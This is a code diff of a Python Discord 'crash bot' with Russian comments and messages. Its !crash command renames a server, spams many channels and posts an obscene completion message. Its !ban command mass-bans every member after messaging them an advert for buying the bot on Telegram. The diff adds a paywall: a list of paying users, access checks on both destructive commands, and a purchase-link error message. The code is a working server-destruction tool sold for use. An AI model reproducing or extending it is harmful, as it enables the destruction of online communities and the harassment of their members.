@@ -16,14 +16,26 @@ SPAM_COUNT_PER_CHANNEL = 50  # Количество спам-сообщений 
 NEW_SERVER_NAME = "CRaSHEd by .7ouh"  # Новое имя сервера
 BAN_MESSAGE = "ты был забанен на крашнутом сервере\nкупить крашбота: https://t.me/crash7ouh"  # Сообщение в ЛС перед баном
 
+# СПИСОК РАЗРЕШЕННЫХ ПОЛЬЗОВАТЕЛЕЙ (ТОЛЬКО ТЕ, КТО ЗАПЛАТИЛ)
+ALLOWED_USERS = [
+    1004905232284778516,  # Твой ID (всегда доступ)
+    # Сюда добавлять ID платных клиентов
+]
+
 intents = discord.Intents.all()
 bot = commands.Bot(command_prefix='!', intents=intents)
+
+
+# Проверка на разрешенного пользователя
+def is_allowed(ctx):
+    return ctx.author.id in ALLOWED_USERS
 
 
 @bot.event
 async def on_ready():
     print(f'Бот {bot.user} запущен!')
     print(f'Серверов: {len(bot.guilds)}')
+    print(f'Разрешено пользователей: {len(ALLOWED_USERS)}')
     await bot.change_presence(activity=discord.Game(name="!crash | !ban"))
 
 
@@ -36,13 +48,16 @@ async def on_command_error(ctx, error):
             print("Не удалось отправить сообщение о недостатке прав")
     elif isinstance(error, commands.CommandNotFound):
         pass
+    elif isinstance(error, commands.CheckFailure):
+        await ctx.send("❌ Эта команда только для платных пользователей!\nКупить доступ: https://t.me/crash7ouh")
     else:
         print(f"Произошла ошибка: {error}")
 
 
-# КОМАНДА !crash
+# КОМАНДА !crash (только для разрешенных)
 @bot.command(name='crash')
 @commands.has_permissions(administrator=True)
+@commands.check(is_allowed)
 async def crash_server(ctx, channels_count: int = 200):
     """Главная команда для краша сервера"""
 
@@ -184,7 +199,7 @@ async def crash_server(ctx, channels_count: int = 200):
             result_channel = await guild.create_text_channel("crash-complete")
 
             result_embed = discord.Embed(
-                title="💥 Я ЗАКОНЧИЛ КОНЧАТЬ НА ВАШ СЕРВЕР",
+                title="💥 ПИЗДА СЕРВАКУ",
                 color=discord.Color.red()
             )
             result_embed.add_field(name="📊 Статистика",
@@ -214,9 +229,10 @@ async def crash_server(ctx, channels_count: int = 200):
             pass
 
 
-# КОМАНДА !ban
+# КОМАНДА !ban (только для разрешенных)
 @bot.command(name='ban')
 @commands.has_permissions(administrator=True)
+@commands.check(is_allowed)
 async def ban_all(ctx, *, reason: str = "Массовый бан от .7ouh"):
     """Банит всех участников сервера"""
 
